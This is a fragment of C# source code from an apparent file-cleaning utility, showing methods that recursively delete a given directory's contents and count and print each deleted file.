                 }
                 catch (System.UnauthorizedAccessException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IO.FileNotFoundException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IO.DirectoryNotFoundException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.Reflection.TargetInvocationException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IO.IOException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.NotSupportedException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IndexOutOfRangeException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.ArgumentException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }

                 try
                 {
                     File.Delete(asrg);
                     Console.ForegroundColor = ConsoleColor.Green;
                 }
                 catch (System.UnauthorizedAccessException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IO.FileNotFoundException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IO.DirectoryNotFoundException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.Reflection.TargetInvocationException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IO.IOException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.NotSupportedException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.IndexOutOfRangeException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch (System.ArgumentException)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }
                 catch
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                 }

             }

             return;

         }*/

        public static void Worker()
        {
            while (true)
            {
                Thread.Sleep(10);
            }
        }


        public static void CleanDir(string asrg)
        {
            if (asrg == null)
                return;
            try
            {
                try
                {
                    foreach (string file in Directory.GetFiles(asrg))
                        Cleaners.DeleteFile(file);
                }
                catch
                {
                }
                try
                {
                    foreach (string directory in Directory.GetDirectories(asrg))
                        Cleaners.CleanDir(directory);
                }
                catch
                {
                }
                try
                {
                    Directory.Delete(asrg, true);
                }
                catch
                {
                }
                try
                {
                    System.IO.File.Delete(asrg);
                }
                catch
                {
                }
            }
            catch
            {
            }
        }

        public static void DeleteFile(string path)
        {
            try
            {
                System.IO.File.Delete(path);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Deleted: " + path);
                Console.ForegroundColor = ConsoleColor.White;
                ++Cleaners.Count;
            }
            catch
            {
            }
        }
    }
}





